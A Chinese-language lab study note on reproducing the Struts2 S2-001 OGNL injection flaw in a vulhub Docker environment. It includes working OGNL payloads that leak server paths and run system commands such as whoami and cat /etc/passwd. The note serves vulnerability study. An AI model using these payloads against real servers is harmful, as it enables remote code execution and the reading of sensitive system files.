~~~
title: 漏洞复现学习（s2-001）
tags: 
  - 渗透测试
  - 漏洞复现
  - struts2
categories: 
  - 渗透测试
  - 漏洞复现
  - struts2
~~~



# Struts2 漏洞S2-001复现学习笔记

## **S2-001复现**

原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。

### 漏洞环境搭建

https://github.com/vulhub/vulhub/tree/master/struts2/s2-001

运行以下命令进行设置

```
docker-compose build
docker-compose up -d
```

访问 http://127.0.0.1:8080/

![http://127.0.0.1:8080/](E:\学习\picture\image-20220329230339236.png)

### 漏洞poc测试

1.输入**%{‘123’}**，sumbit

![image-20220329230626576](E:\学习\picture\image-20220329230626576.png)

2.返回123，参数值，证明漏洞存在

![image-20220329230736190](E:\学习\picture\image-20220329230736190.png)

### 构造poc

1. #### 获取tomcat路径：

   ~~~
   %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
   ~~~

   ![image-20220329231256122](E:\学习\picture\image-20220329231256122.png)

   语句执行后，查看返回的语句信息：

   ![image-20220329231351168](E:\学习\picture\image-20220329231351168.png)

2. #### 获取网站真实路径：

   ~~~
   %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
   ~~~

   ![image-20220329231515325](E:\学习\picture\image-20220329231515325.png)

   ![image-20220329231641526](E:\学习\picture\image-20220329231641526.png)

   

3. #### 构造查看权限的poc：

   ~~~
   %{
   
   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
   
   #b=#a.getInputStream(),
   
   #c=new java.io.InputStreamReader(#b),
   
   #d=new java.io.BufferedReader(#c),
   
   #e=new char[50000],
   
   #d.read(#e),
   
   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
   
   #f.getWriter().println(new java.lang.String(#e)),
   
   #f.getWriter().flush(),#f.getWriter().close()
   
   }
   ~~~

   ![image-20220329231953711](E:\学习\picture\image-20220329231953711.png)

4. #### 执行任意命令只需要将上面的poc中whoami替换：

   ~~~~
   %{
   
   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
   
   #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
   
   #d=new java.io.BufferedReader(#c),
   
   #e=new char[50000],#d.read(#e),
   
   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
   
   #f.getWriter().println(new java.lang.String(#e)),
   
   #f.getWriter().flush(),
   
   #f.getWriter().close()
   
   }
   ~~~~

   ![image-20220329232113613](E:\学习\picture\image-20220329232113613.png)

5. #### 执行命令（带参数的命令：`new java.lang.String[]{"cat","/etc/passwd"}`）：

   ~~~~
   %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
   ~~~~

   ![image-20220329231930856](E:\学习\picture\image-20220329231930856.png)

### 关闭docker环境

~~~
命令：docker-compose down -v
~~~

